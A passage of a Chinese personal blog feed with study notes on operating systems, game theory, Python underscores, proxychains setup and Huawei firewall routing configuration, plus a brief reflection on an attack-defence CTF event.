title="第五章"></a>第五章</h1><h2 id="虚拟存储器定义"><a href="#虚拟存储器定义" class="headerlink" title="虚拟存储器定义"></a>虚拟存储器定义</h2><p>具有请求调入和置换功能，从逻辑上对内存扩充的存储器系统</p><h2 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h2><ul><li>多次性    分多次装入内存</li><li>对换性</li><li>虚拟性</li></ul><h2 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h2><h3 id="Optimal-最佳置换算法"><a href="#Optimal-最佳置换算法" class="headerlink" title="Optimal 最佳置换算法"></a>Optimal 最佳置换算法</h3><p>预测最久不使用的页并进行替换。</p><h3 id="FIFO-先进先出页面置换算法"><a href="#FIFO-先进先出页面置换算法" class="headerlink" title="FIFO 先进先出页面置换算法"></a>FIFO 先进先出页面置换算法</h3><p>总淘汰最先进入的（驻留最久的）</p><h3 id="LRU-Least-Recent-Used-最近最久未使用"><a href="#LRU-Least-Recent-Used-最近最久未使用" class="headerlink" title="LRU (Least Recent Used) 最近最久未使用"></a>LRU (Least Recent Used) 最近最久未使用</h3><p>选择最近最久未使用的页面</p><p>LRU和OPT，加物理块数不会增加缺页次数，FIFO不一定能减少缺页次数</p><h2 id="抖动"><a href="#抖动" class="headerlink" title="抖动"></a>抖动</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>运行的进程太多，频繁出新缺页，进程大部分时间都用于页面的换进换出</p><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><ul><li>局部置换策略    只在分配给自己的内存中置换</li></ul><h2 id="请求分段储存管理"><a href="#请求分段储存管理" class="headerlink" title="请求分段储存管理"></a>请求分段储存管理</h2><h3 id="共享段表"><a href="#共享段表" class="headerlink" title="共享段表"></a>共享段表</h3><h3 id="分段保护"><a href="#分段保护" class="headerlink" title="分段保护"></a>分段保护</h3><ul><li>越界检查</li><li>存取控制检查</li><li>环保护机构 类似系统的内核等级</li></ul><h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><h2 id="I-O基本功能"><a href="#I-O基本功能" class="headerlink" title="I/O基本功能"></a>I/O基本功能</h2><ul><li>方便用户使用</li><li>提高CPU和IO设备利用率</li><li>共享设备时提供方便</li></ul><h2 id="中断处理程序"><a href="#中断处理程序" class="headerlink" title="中断处理程序"></a>中断处理程序</h2><ul><li>测定是否有未响应的中断信号</li><li>保护被中断进程的CPU环境</li><li>转入相应的设备处理程序</li><li>中断处理</li><li>恢复CPU现场并退出中断</li></ul><p>图p206</p><h2 id="DMA控制器"><a href="#DMA控制器" class="headerlink" title="DMA控制器"></a>DMA控制器</h2><h3 id="主机-控制器接口"><a href="#主机-控制器接口" class="headerlink" title="主机-控制器接口"></a>主机-控制器接口</h3><ul><li>DR 数据寄存器</li><li>MAR 内存地址寄存器</li><li>DC 数据计数器</li><li>CR 命令/状态寄存器</li></ul><p>DC，MAR，CR获得从CPU传来的数据和命令，DR获取数据，并传入MAR</p><p>设置MAR和DC初值 -&gt; 启动DMA -&gt; 使用存储器周期传送数据 -&gt; 存储器地址+1，DC-1 -&gt; 循环</p><p>若DC = 0 请求中断</p><h2 id="与设备无关IO"><a href="#与设备无关IO" class="headerlink" title="与设备无关IO"></a>与设备无关IO</h2><ul><li>以物理设备名使用设备     不灵活，利用率也不高</li><li>逻辑设备名 </li></ul><h3 id="设备控制表DCT"><a href="#设备控制表DCT" class="headerlink" title="设备控制表DCT"></a>设备控制表DCT</h3><ul><li>设备类型</li><li>设备标志符</li><li>设备状态</li><li>指向控制器表的指针</li><li>重复执行次数或时间</li><li>设备队列的队首指针</li></ul><h3 id="控制器控制表COCT"><a href="#控制器控制表COCT" class="headerlink" title="控制器控制表COCT"></a>控制器控制表COCT</h3><p>记录控制器情况</p><h3 id="LUT-Logical-Unit-Table-逻辑设备表"><a href="#LUT-Logical-Unit-Table-逻辑设备表" class="headerlink" title="LUT (Logical Unit Table) 逻辑设备表"></a>LUT (Logical Unit Table) 逻辑设备表</h3><p>逻辑设备名 | 物理设备名 | 驱动程序入口地址</p><p>/dev/tty      |  3                |  1024</p><p>逻辑设备表 | 系统设备表指针</p><p>/dev/tty.     |    3</p><h2 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h2><p>CPU和IO设备速度不匹配</p><p>利用缓冲寄存器暂存数据</p><h2 id="磁盘调度算法"><a href="#磁盘调度算法" class="headerlink" title="磁盘调度算法"></a>磁盘调度算法</h2><h3 id="FCFS"><a href="#FCFS" class="headerlink" title="FCFS"></a>FCFS</h3><h3 id="SSTF-Shortest-Search-Time-First-最短寻道时间优先"><a href="#SSTF-Shortest-Search-Time-First-最短寻道时间优先" class="headerlink" title="SSTF (Shortest Search Time First) 最短寻道时间优先"></a>SSTF (Shortest Search Time First) 最短寻道时间优先</h3><h2 id="基于扫描的磁盘调度"><a href="#基于扫描的磁盘调度" class="headerlink" title="基于扫描的磁盘调度"></a>基于扫描的磁盘调度</h2><h3 id="SCAN-扫描算法-又称电梯调度算法"><a href="#SCAN-扫描算法-又称电梯调度算法" class="headerlink" title="SCAN 扫描算法 又称电梯调度算法"></a>SCAN 扫描算法 又称电梯调度算法</h3><p>要访问的磁道与刺头当前距离较近</p><h1 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>文件逻辑结构</p><p>文件由一系列逻辑记录组成，是可以直接处理的数据及其结构，独立于文件的物理特性，又称文件组织</p><p>物理结构</p><h1 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h1><p>对磁盘管理器的要求</p><ul><li>有效地利用存储空间</li><li>提高磁盘IO速率</li><li>提高磁盘系统可靠性</li></ul><p>外存组织方式</p><ul><li>连续</li><li>链接</li><li>索引</li></ul><h2 id="链接组织方式"><a href="#链接组织方式" class="headerlink" title="链接组织方式"></a>链接组织方式</h2><p>显式 表中放指针，链表、隐式 链表</p><h2 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h2><p>分成卷</p><p>一个磁盘可多个卷，一个卷可由多个磁盘组成</p><p>文件第一个盘号放在FCB中，FAT每个表项最后放下一个盘块号</p><h3 id="簇"><a href="#簇" class="headerlink" title="簇"></a>簇</h3><p>是一组相邻的上去，作为虚拟扇区。盘块分配时以簇为基本单位</p><p>好处：能适应磁盘容量不断增大的情况，还可减少FAT表中项数</p><h2 id="文件储存空间管理"><a href="#文件储存空间管理" class="headerlink" title="文件储存空间管理"></a>文件储存空间管理</h2><h3 id="空闲表法"><a href="#空闲表法" class="headerlink" title="空闲表法"></a>空闲表法</h3><p>给每个文件分配连续存储空间。</p><p>系统也会为外存空闲区建立空闲表</p><h3 id="位视图法"><a href="#位视图法" class="headerlink" title="位视图法"></a>位视图法</h3><p>二位数组模样，m*n=磁盘总块数</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博弈论</title>
    <link href="/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/"/>
    <url>/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/av41333177?p=2" target="_blank" rel="noopener"><br>LINK</a><br>《博弈圣经》博弈论的定义：我们把动物利用大自然移动的瘾魂，在决策人期待的空间里，形成三维均衡的学术理论，称为博弈论。<br>基本概念中包括局中人、行动、信息、策略、收益、均衡和结果等。其中局中人、策略和收益是最基本要素。局中人、行动和结果被统称为博弈规则。</p><h2 id="Class1"><a href="#Class1" class="headerlink" title="Class1"></a>Class1</h2><p><strong><em>定义：如果一个选项得到的结果严格优于另一个选项，那么称这个选项为严格优势策略。\</em></strong></p><p><strong>结论1：不要选择严格劣势策略</strong></p><p><strong>结论2：理性的选择，使得总结果变得更坏</strong></p><p>改变收益，就会改变目的。</p><p><strong><em>结论3：予欲得之，必先知之\</em></strong></p><p>结论4：分析他们（对手）的收益，站在别人的立场上去分析他们会怎么做</p><blockquote><p>2019/8/6</p></blockquote><hr><h2 id="Class2"><a href="#Class2" class="headerlink" title="Class2"></a>Class2</h2><p>博弈的要素：参与人（i,j）、策略（si,Si策略集合，s某一次博弈）、收益（U，Ui(s)）</p><p>s-i:除了i以外其他参与人每人的策略</p><table><thead><tr><th align="left">1/2</th><th align="left">L</th><th align="left">C</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">T</td><td align="left">5,-1</td><td align="left">11,3</td><td align="left">0,0</td></tr><tr><td align="left">B</td><td align="left">6,4</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p>S1={T,B} S2={L,C,R}</p><p>U1(T,C)=11 U2(T，C)=3</p><p>定义：参与人i的策略s’i严格劣于另一个策略si，在其他人选择s-i时，选择si的收益UI严格优于此情况下选择s’i的收益UI</p><table><thead><tr><th align="left">De/Attach</th><th align="left">ez</th><th align="left">hard</th></tr></thead><tbody><tr><td align="left">E</td><td align="left">1,1</td><td align="left">1,1</td></tr><tr><td align="left">H</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p><strong><em>定义：参与者i的策略s’i，弱劣于策略si当且仅当在对手选择s-i的情况下，参与人i选择si的收益等于对手选s-i下他选s’i的收益，而且在任何情况下均成立。除此之外，对手选s-i参与者的i的策略si，严格优于其他策略s’i，至少在某种情况下成立\</em></strong>（参与者i的策略s’i弱劣于策略si，当且仅当无论对手怎么做，他选择si的收益至少与选择s‘i的相等，有些情况甚至是严格占优的）</p><p>共同知识：我知道一个事情，你也知道这件事，我知道你知道，你知道我知道……</p><p>相互知识不是共同知识，共同知识定义很严格。</p><blockquote><p>2019/8/7</p></blockquote><hr><h2 id="Class-3"><a href="#Class-3" class="headerlink" title="Class 3"></a>Class 3</h2><p>迭代剔除劣势策略：揣测对手意图，揣测对手知道我们的意图</p><p>商业会集中获得附近客源</p><p>==第三竞选者如何影响选举结果?==</p><p>最佳对策：最大化预期收益</p><p><a href="https://i.loli.net/2019/08/10/g9hIt6PSRsxrcul.png" target="_blank" rel="noopener"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA/g9hIt6PSRsxrcul.png" srcset="/img/loading.gif" alt="Class 3 画图"></a></p><p>画图用数据解释比较好</p><blockquote><p>2019/8/8</p></blockquote><hr><h2 id="Class4"><a href="#Class4" class="headerlink" title="Class4"></a>Class4</h2><table><thead><tr><th align="left">F/D</th><th align="left">L</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">L</td><td align="left">4.-4</td><td align="left">9,-9</td></tr><tr><td align="left">M</td><td align="left">6,-6</td><td align="left">6,-6</td></tr><tr><td align="left">R</td><td align="left">9,-9</td><td align="left">4,-4</td></tr></tbody></table><p><a href="https://i.loli.net/2019/08/10/3XoNK7aLYSU5VTM.png" target="_blank" rel="noopener"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA/3XoNK7aLYSU5VTM.png" srcset="/img/loading.gif" alt="Class4 另一种画图方法"></a></p><p>不要选择一个任何选择下都非最佳对策的策略。</p><p><strong><em>最佳对策：参与人i的策略Si，是一个最佳对策（BR），是对手的策略S-i的最佳对策。如果参与人i在对手的s-i策略下，选Si的收益弱优于对手的其他策略Si’\</em></strong></p><p><strong><em>最佳对策：Si满足所有情况中，最大化了对手选S-i时我的收益\</em></strong></p><p>合伙人：两个实体共同完成一个协作项目，并且平分利润</p><p>外部性：我的努力不仅对我有利，对你也有利</p><p>纳什均衡：没人想选择其他策略，在这个点，互相都采用的是最佳策略</p><blockquote><p>2019/8/9</p></blockquote><p><strong><em>未完待续\</em></strong></p>]]></content>
    
    
    <categories>
      
      <category>课外学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯线下AWD总结</title>
    <link href="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/"/>
    <url>/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="安洵杯线下AWD总结"><a href="#安洵杯线下AWD总结" class="headerlink" title="安洵杯线下AWD总结"></a>安洵杯线下AWD总结</h1><img src="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/image-20191210210716136.png" srcset="/img/loading.gif" class="" title="image-20191210210716136"><img src="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/95038C770B129D8AE642F53530CAB33B.jpg" srcset="/img/loading.gif" class="" title="img"><h2 id="事后BB"><a href="#事后BB" class="headerlink" title="事后BB"></a>事后BB</h2><p>==赛前自动提交flag脚本没有，自动化打全场脚本没有，哎。==</p><p>线下还是很友好的，可以连接外网，伙食也很不错，但是！</p><p><strong>只有先黑盒测试过了自己的，拿了flag并提交了之后，才可以找主办方要ssh密码=。=并且AWD只有1道pwn题，3个web题，域渗透部分就更不必多说了，都是web，哎</strong></p><h2 id="AWD规则"><a href="#AWD规则" class="headerlink" title="AWD规则"></a>AWD规则</h2><p>连接的是docker服务器，所以给的都是端口</p><p>端口列表：axx80/axx22 </p><ul><li>eg: team01-web1 10180(web) 10122(ssh) </li><li>eg: team18-web2 11880(web) 11822(ssh) </li><li>eg: team19-web3 30180(web) 30122(ssh) </li><li>eg: team01-pwn1 40180(pwn) 40122(ssh)</li></ul><p>==比如我拿到的pwn端口是40980，那么别人的就是4xx80，40080端口到41780端口，写打全场脚本就这样挨个端口打过去==</p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>开局好久都是蒙蔽状态，不知道ip，不知道端口，<strong>但其实这些都在群里发的线下赛说明中包含有，需要注意去看QAQ</strong></p><p>有空了我就找找看看写写自动化提交和多进程打全场脚本QAQ</p><p>pwn的话，就专心做，打通了，自己的这边的话就修改一下栈的位置？挪一下栈什么的，打个patch就好了= =（当然我还没试过，慢慢学习.jpg）</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><a href="https://xz.aliyun.com/t/3607" target="_blank" rel="noopener">AWD二进制运维工具</a></p><p><a href="https://www.cnblogs.com/work115/p/5621789.html" target="_blank" rel="noopener">python之多进程</a>-因为听南梦说多线程容易崩</p><p><a href="https://www.cnblogs.com/xiao-apple36/p/9144092.html" target="_blank" rel="noopener">Python模块学习 - Paramiko</a></p><p>幸好新苗没中，可以专心搞pwn了哎</p><p>向南梦大佬学习，<a href="https://196011564.github.io/" target="_blank" rel="noopener">link</a></p>]]></content>
    
    
    <categories>
      
      <category>反思总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python中下划线的5种含义</title>
    <link href="/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/"/>
    <url>/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p>在用python重写算法，学习学习算法时，一时好奇（打基础）来学习了python的下划线</p><ul><li><p>单前导下划线：_var            小小警示，提示只在内部使用，非public和private那种</p></li><li><p>单末尾下划线：var_            解决命名冲突的问题</p></li><li><p>双前导下划线：__var          防止变量在子类中被重写，只能在类内访问</p></li><li><p>单下划线：_                        使用“_”来表示它只是一个临时值</p></li><li><p>双前导和末尾下划线：</p><pre><code>__var__</code></pre><p>这个感觉有点奇怪，一个是常见的类内init，另一个则是下面这种len的写法</p><p></p><pre><code class="python">class Linkedlist(object):    def __init__(self):        self.head = Node()        self.length = 0    def __len__(self):        return self.length</code></pre><p>当我在main里</p><pre><code class="python">def main():    L = Linkedlist()    L.append(3)    L.append(5)    print(&quot;链表长度&quot;,len(L))if __name__ == &#39;__main__&#39;:    main()</code></pre><p>这样也可以输出len来= =</p></li></ul><p>  学习的网站：</p><ul><li><a href="https://blog.csdn.net/tcx1992/article/details/80105645" target="_blank" rel="noopener">https://blog.csdn.net/tcx1992/article/details/80105645</a></li><li><a href="https://blog.csdn.net/zhangvalue/article/details/93606688" target="_blank" rel="noopener">https://blog.csdn.net/zhangvalue/article/details/93606688</a></li></ul><p>  感觉跟着一步步测试下来更会用，但想完全知道怎么来的估计得去翻文档www</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
      <category>学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Proxychains</title>
    <link href="/2020/01/13/Proxychains/"/>
    <url>/2020/01/13/Proxychains/</url>
    
    <content type="html"><![CDATA[<p>折腾两小时，不如问一下人= =</p><p>Proxychains</p><p>先安装</p><p>然后sudo vi /etc/proxychains.conf</p><p>socks5 win_ip 1080</p><p>win_ip为你的windows主机ip，可在cmd ifconfig查看</p><p>飞机要打开允许局域网连接</p><img src="/2020/01/13/Proxychains/image-20200110135926592.png" srcset="/img/loading.gif" class="" title="image-20200110135926592"><p>然后运行测试</p><p>proxychains4 telnet <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> 443</p><p>可以之后就可以直接sudo proxychains4 apt-get update了</p>]]></content>
    
    
    <categories>
      
      <category>Linux使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 问题解决</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCNP-SEC-19.11.23</title>
    <link href="/2020/01/13/HCNP-SEC-19.11.23/"/>
    <url>/2020/01/13/HCNP-SEC-19.11.23/</url>
    
    <content type="html"><![CDATA[<h1 id="HCNP-SEC-19-11-23"><a href="#HCNP-SEC-19-11-23" class="headerlink" title="HCNP-SEC-19.11.23"></a>HCNP-SEC-19.11.23</h1><img src="/2020/01/13/HCNP-SEC-19.11.23/648EB2E3-ECFB-4610-AC4F-C41A40C726F0.png" srcset="/img/loading.gif" class="" title="648EB2E3-ECFB-4610-AC4F-C41A40C726F0"><blockquote><p>eSight网管 可管其他厂商设备，几乎都可以</p><p>CIS可用于抵御APT攻击。它从海量数据中提取关键信息，智能可视化，还原攻击链，防御攻击</p><p>FireHunter还原流量，在虚拟环境对网络中传输的文件进行检测</p><p>UMA 审计上网行为</p><p>NGFW USG9000 网络运营商，广电（超大型网络）USG6000 中大型企业</p><p>业务随行</p><p>S12700 整个网络核心 S9k S7k</p><img src="/2020/01/13/HCNP-SEC-19.11.23/61051AC5-C8D2-47E8-9516-09E3979F7769.png" srcset="/img/loading.gif" class="" title="61051AC5-C8D2-47E8-9516-09E3979F7769"></blockquote><h2 id="网络安全运维"><a href="#网络安全运维" class="headerlink" title="网络安全运维"></a>网络安全运维</h2><p>安全策略：简单，稳定，安全</p><p>端口要加端口描述</p><p>脚本配置</p><img src="/2020/01/13/HCNP-SEC-19.11.23/52CCD98F-87B0-4D17-9CD9-043B92E84B1E.png" srcset="/img/loading.gif" class="" title="52CCD98F-87B0-4D17-9CD9-043B92E84B1E"><img src="/2020/01/13/HCNP-SEC-19.11.23/6D82AE28-99ED-4EE5-8BAF-F34E0639D652.png" srcset="/img/loading.gif" class="" title="6D82AE28-99ED-4EE5-8BAF-F34E0639D652"><img src="/2020/01/13/HCNP-SEC-19.11.23/9C6D9139-095E-43E4-A914-232B379D1387.png" srcset="/img/loading.gif" class="" title="9C6D9139-095E-43E4-A914-232B379D1387"><img src="/2020/01/13/HCNP-SEC-19.11.23/0C995BDD-0A38-483B-B32B-727CA8AAF2C4.png" srcset="/img/loading.gif" class="" title="0C995BDD-0A38-483B-B32B-727CA8AAF2C4"><blockquote><p>监控（类似只读）</p></blockquote><img src="/2020/01/13/HCNP-SEC-19.11.23/4731E999-DBE2-4436-B428-3BC61E399D80.png" srcset="/img/loading.gif" class="" title="4731E999-DBE2-4436-B428-3BC61E399D80"><img src="/2020/01/13/HCNP-SEC-19.11.23/B33BEC42-D775-4EDF-98B9-08454E630607.png" srcset="/img/loading.gif" class="" title="B33BEC42-D775-4EDF-98B9-08454E630607"><img src="/2020/01/13/HCNP-SEC-19.11.23/3B696243-B418-4CCF-AE64-B94BC4556C4D.png" srcset="/img/loading.gif" class="" title="3B696243-B418-4CCF-AE64-B94BC4556C4D"><img src="/2020/01/13/HCNP-SEC-19.11.23/3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3.png" srcset="/img/loading.gif" class="" title="3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3"><img src="/2020/01/13/HCNP-SEC-19.11.23/7BC6559D-1E13-4026-AC0A-B341738B51A7.png" srcset="/img/loading.gif" class="" title="7BC6559D-1E13-4026-AC0A-B341738B51A7"><img src="/2020/01/13/HCNP-SEC-19.11.23/C7585DFE-372F-4841-B579-E5ABF8B743C4.png" srcset="/img/loading.gif" class="" title="C7585DFE-372F-4841-B579-E5ABF8B743C4"><img src="/2020/01/13/HCNP-SEC-19.11.23/A037C828-5CD5-4549-A6A4-E7E7CBE5A54C.png" srcset="/img/loading.gif" class="" title="A037C828-5CD5-4549-A6A4-E7E7CBE5A54C"><img src="/2020/01/13/HCNP-SEC-19.11.23/62BE7CDD-3135-430E-987F-6EACF0D80B0A.png" srcset="/img/loading.gif" class="" title="62BE7CDD-3135-430E-987F-6EACF0D80B0A"><img src="/2020/01/13/HCNP-SEC-19.11.23/FE1DD198-9061-4788-819D-4EB92584BB87.png" srcset="/img/loading.gif" class="" title="FE1DD198-9061-4788-819D-4EB92584BB87"><img src="/2020/01/13/HCNP-SEC-19.11.23/9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E.png" srcset="/img/loading.gif" class="" title="9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E"><img src="/2020/01/13/HCNP-SEC-19.11.23/C3771611-034E-4CE2-B951-D908189A4396.png" srcset="/img/loading.gif" class="" title="C3771611-034E-4CE2-B951-D908189A4396"><img src="/2020/01/13/HCNP-SEC-19.11.23/C8E502F2-BA95-4D88-980E-B339A71104CC.png" srcset="/img/loading.gif" class="" title="C8E502F2-BA95-4D88-980E-B339A71104CC"><p>QS 优先级？优先保证业务</p><p>FW作为出口且有多条出口链路，两条链路一接，最起码也要做一个链路聚合（Eth-Trunck）</p><p>在ensp中，fw连接router，在实际中不会占用GE0/0/0（这是个管理口）</p><h2 id="智能选路应用场景"><a href="#智能选路应用场景" class="headerlink" title="智能选路应用场景"></a>智能选路应用场景</h2><p>网络差，如何优化：增加带宽，增加IP，调整点位</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130211703575.png" srcset="/img/loading.gif" class="" title="image-20191130211703575"><ul><li>全局选路策略：动态选择出接口，充分利用资源</li><li>策略路由：依据制定的策略进行数据转发</li><li><strong>ISP路由</strong>：可以实现流量按照运营商转发，指定选路</li><li>健康检查，感知服务器或链路状态变化，保证流量传输</li></ul><blockquote><p>园区网的四大敏捷特性：有线无线深度融合，业务随行，安全协防，IPCA质量感知（极少）</p></blockquote><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130213239431.png" srcset="/img/loading.gif" class="" title="image-20191130213239431"><blockquote><p>路由策略和策略路由的区别？？</p></blockquote><h2 id="选路原理"><a href="#选路原理" class="headerlink" title="选路原理"></a>选路原理</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130213351116.png" srcset="/img/loading.gif" class="" title="image-20191130213351116"><h3 id="过载保护：有预值"><a href="#过载保护：有预值" class="headerlink" title="过载保护：有预值"></a>过载保护：有预值</h3><ul><li>根据带宽：默认的。<strong>原流量仍从该链路走，后续不再。并且全部过载，则继续根据比例分配流量</strong><img src="HCNP-SEC-19.11.23/image-20191130220056847.png" srcset="/img/loading.gif" alt="image-20191130220056847">)<img src="HCNP-SEC-19.11.23/image-20191130220558188.png" srcset="/img/loading.gif" alt="image-20191130220558188"></li></ul><blockquote><p>入方向？出方向？</p></blockquote><ul><li>根据链路质量：<strong>保证质量，保证体验</strong><img src="HCNP-SEC-19.11.23/image-20191130221210672.png" srcset="/img/loading.gif" alt="image-20191130221210672">)<img src="HCNP-SEC-19.11.23/image-20191130221323811.png" srcset="/img/loading.gif" alt="image-20191130221323811"></li><li>根据链路权重：根据预设的权重</li><li>根据链路优先级：默认优先级高的，超过过载阈值时启用优先级次高的链路。（少用，不可能闲置）</li></ul><h3 id="过载保护的问题"><a href="#过载保护的问题" class="headerlink" title="过载保护的问题"></a>过载保护的问题</h3><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130221945199.png" srcset="/img/loading.gif" class="" title="image-20191130221945199"><p>会话保持：<img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130222127477.png" srcset="/img/loading.gif" class="" title="image-20191130222127477"></p><p>查看会话保持表项（要有流量经过才能查看到</p><pre><code>display session persistence table</code></pre><h2 id="策略路由"><a href="#策略路由" class="headerlink" title="策略路由"></a>策略路由</h2><p>依据用户制定的策略进行转发</p><p>bypass 直通模式，FW相当于透明</p>{% asset_img image-20191130222809732.png image-20191130222809732 %}{% asset_img image-20191130222832266.png image-20191130222832266 %}<blockquote><p>先看策略，无策略则按路由表转发</p></blockquote><h2 id="ISP选路"><a href="#ISP选路" class="headerlink" title="ISP选路"></a>ISP选路</h2><p>在FW连接多个ISP网络时，通过ISP选路可以使访问特定ISP的流量通过相应出接口转发，保证最短路径。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>写入CSV文件（该文件成为ISP地址文件），然后导入FW</p>{% asset_img image-20191130223451969.png image-20191130223451969 %}<blockquote><p>导入ISP地址文件：Web界面操作 网络 &gt; 路由 &gt; 智能选路 &gt; 运营商地址库</p><p>应用： 网络&gt; 接口 &gt; 编辑</p></blockquote><h3 id="可选：健康检查"><a href="#可选：健康检查" class="headerlink" title="可选：健康检查"></a>可选：健康检查</h3><p>探测到无法访问，对应ISP路由会被删除</p>{% asset_img image-20191130223853655.png image-20191130223853655 %}<h2 id="策略路由应用"><a href="#策略路由应用" class="headerlink" title="策略路由应用"></a>策略路由应用</h2><p>修改名称，配置端口描述</p>{% asset_img image-20191130224518587.png image-20191130224518587 %}{% asset_img image-20191130224603119.png image-20191130224603119 %}{% asset_img image-20191130224624111.png image-20191130224624111 %}<h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>配置安全区域</p><pre><code>interface GE1/0/2ip address 10.10.1.1 24quit interface GE1/0/3ip address 10.1.1.1 24in GE1/0/4ip add 10.20.1.1 24firewall zone trustset priority 85add interface GE1/0/3quitfirewall zone untrustset priority 5add interface GE1/0/2add interface GE1/0/4</code></pre><p>配置安全策略</p><pre><code>security-policyrule name policy_sec_sec_trust_untrustsource-zone trustdestination-zone untrustaction permitsource-address 10.1.1.0 24 </code></pre><p>一定要写action，不然默认不允许通过</p><p>配置IP-Link</p><p>目标ip 通过 xx 端口 </p><pre><code>ip-link check enableip-link name pbr_1destination 10.10.1.2 interface GE 1/0/2quitip-link name pbr_2destination 10.20.1.2 interface GE 1/0/4</code></pre><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130225841573.png" srcset="/img/loading.gif" class="" title="image-20191130225841573"><h2 id="故障排查"><a href="#故障排查" class="headerlink" title="故障排查"></a>故障排查</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130225907120.png" srcset="/img/loading.gif" class="" title="image-20191130225907120"><p>主要问题多为<strong>域间流量是否放行</strong></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130230708184.png" srcset="/img/loading.gif" class="" title="image-20191130230708184"><p>实验脚本</p><pre><code>R1:syssysname r1int e0/0/0ip add 10.1.1.2 24des to-pc1-e0/0/1qint g0/0/0ip add 10.10.1.1 24des to-fw-g1/0/0qint e0/0/1des to-pc2-e0/0/1ip add 10.1.2.2 24</code></pre><blockquote><p>Dis cu | in ip-link</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络专业知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GXY_CTF_my_cannary-从零记录如何调试出来</title>
    <link href="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/"/>
    <url>/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/</url>
    
